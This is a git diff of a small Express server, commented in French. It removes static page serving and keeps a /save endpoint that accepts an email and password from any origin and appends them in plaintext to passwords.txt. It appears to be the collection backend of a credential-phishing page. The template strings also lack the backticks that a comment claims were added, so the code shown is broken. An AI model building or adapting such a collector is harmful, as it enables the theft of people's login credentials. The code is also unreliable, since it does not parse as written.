@@ -6,19 +6,13 @@ const cors = require('cors');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Middleware pour JSON et CORS
 app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// Servir le dossier STOKE comme public
-// ../STOKE car serveur.js est dans backend/
-app.use(express.static(path.join(__dirname, '../STOKE')));
-
-// Chemin pour le fichier passwords.txt
 const FILE_PATH = path.join(__dirname, 'passwords.txt');
 
-// Route pour enregistrer email et mot de passe
+// Route pour sauvegarder email et mot de passe
 app.post('/save', (req, res) => {
   const { email, password } = req.body;
 
@@ -26,6 +20,7 @@ app.post('/save', (req, res) => {
     return res.status(400).send('Email et mot de passe requis');
   }
 
+  // Ligne corrigée avec backticks pour template string
   const line = Email: ${email}, Password: ${password}\n;
 
   fs.appendFile(FILE_PATH, line, (err) => {
@@ -37,12 +32,11 @@ app.post('/save', (req, res) => {
   });
 });
 
-// Route racine pour afficher index.html
+// Route pour vérifier si le serveur fonctionne
 app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, '../STOKE/index.html'));
+  res.send('Server running');
 });
 
-// Lancer le serveur
 app.listen(PORT, () => {
   console.log(Server running on port ${PORT});
 });
